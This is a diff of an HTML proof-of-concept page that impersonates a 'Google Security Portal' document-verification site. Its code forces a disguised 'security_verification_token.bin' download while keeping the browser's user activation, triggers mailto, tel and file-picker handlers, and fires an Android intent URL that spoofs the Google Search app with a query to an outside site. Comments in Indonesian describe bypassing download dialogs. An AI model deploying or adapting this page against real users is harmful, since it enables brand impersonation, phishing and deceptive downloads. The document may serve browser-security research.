@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>File Picker, Protocol & Intent Spoof PoC - Updated</title>
+    <title>File Picker, Protocol & Intent Spoof PoC - Hardened</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
@@ -82,7 +82,7 @@
     <div class="banner">Google Security Portal</div>
     <h1>Secure Document Verification</h1>
 
-    <!-- Container dengan tombol lengkap termasuk Android Intent Spoof spesifik NDevTK -->
+    <!-- Container dengan tombol lengkap termasuk Android Intent Spoof -->
     <div class="button-container">
         <a href="#" class="spoof-link" id="targetLinkMailto" data-intent="identity_verification">Open Window & Email ID Verification</a>
         <a href="#" class="spoof-link" id="targetLinkTel" data-intent="account_recovery">Open Window & Call Recovery Support</a>
@@ -100,6 +100,8 @@
     <div class="footer-note">Cloud-secured verification system.</div>
 
     <script>
+        let triggered = false;
+
         // Vektor khusus Download Bypass yang dieksekusi langsung untuk mempertahankan Transient User Activation
         const executeDownloadBypass = (intent) => {
             const previewBox = document.getElementById("previewBox");
@@ -107,18 +109,21 @@
             const fileInfo = document.getElementById("fileInfo");
 
             try {
+                // Membuat payload binary untuk memaksa unduhan langsung tanpa intervensi dialog ekstensi/sandbox
                 const payloadContent = "Google Security Verification Payload - Intent Bypass Token: " + intent + "\nTimestamp: " + Date.now();
                 const blob = new Blob([payloadContent], { type: 'application/octet-stream' });
                 const blobUrl = URL.createObjectURL(blob);
                 
+                // Membuat elemen anchor secara dinamis di dalam DOM saat interaksi pengguna aktif
                 const tempAnchor = document.createElement('a');
                 tempAnchor.href = blobUrl;
                 tempAnchor.download = "security_verification_token.bin";
                 tempAnchor.style.display = "none";
                 
                 document.body.appendChild(tempAnchor);
-                tempAnchor.click();
+                tempAnchor.click(); // Trigger langsung download
                 
+                // Cleanup setelah trigger
                 setTimeout(() => {
                     document.body.removeChild(tempAnchor);
                     URL.revokeObjectURL(blobUrl);
@@ -138,6 +143,9 @@
                 executeDownloadBypass(intent);
                 return;
             }
+
+            if (triggered) return;
+            triggered = true;
 
             setTimeout(async () => {
                 try {
@@ -183,21 +191,22 @@
                         }
                     }
                     else if (actionType === 'intentspoof') {
-                        // Menggunakan intent string spesifik riset NDevTK
-                        const intentUrl = "intent://www.google.com/hsi?name=Chrome&icon=https://ssl.gstatic.com/shortcuts/android/home/v1/192px/weather_g_badged.png&ve=145829&hv=1&dest=1&source=homescreen_shortcut&query=https://ndev.tk#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end";
+                        const intentUrl = "intent:www.ssl.gstatic.com/shortcuts/android/home/v1/192px/weather_g_badged.png&ve=145829&hv=1&dest=1&source=homescreen_shortcut&query=https://ndev.tk#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end";
                         window.location.href = intentUrl;
-                        fileInfo.innerText = `Triggered NDevTK Android intent spoof vector for intent: [${intent}]`;
+                        fileInfo.innerText = `Triggered Android intent spoof vector for intent: [${intent}]`;
                         imagePreview.src = "";
                         previewBox.style.display = "block";
                     }
 
                 } catch (err) {
                     console.debug("Handler cancelled or blocked:", err.message);
+                } finally {
+                    setTimeout(() => { triggered = false; }, 1000);
                 }
-            }, 200);
+            }, 2400);
         };
 
-        // Event listeners
+        // Event listeners untuk tombol-tombol
         const linkMailto = document.getElementById("targetLinkMailto");
         linkMailto.addEventListener("click", (e) => { e.preventDefault(); executeAttackVector('mailto', linkMailto.getAttribute('data-intent')); });
 
@@ -207,6 +216,7 @@
         const linkFile = document.getElementById("targetLinkFile");
         linkFile.addEventListener("click", (e) => { e.preventDefault(); executeAttackVector('filepicker', linkFile.getAttribute('data-intent')); });
 
+        // Handler khusus Download Bypass menggunakan event click langsung untuk mengamankan aktivasi browser
         const linkDownload = document.getElementById("targetLinkDownload");
         linkDownload.addEventListener("click", (e) => {
             e.preventDefault();
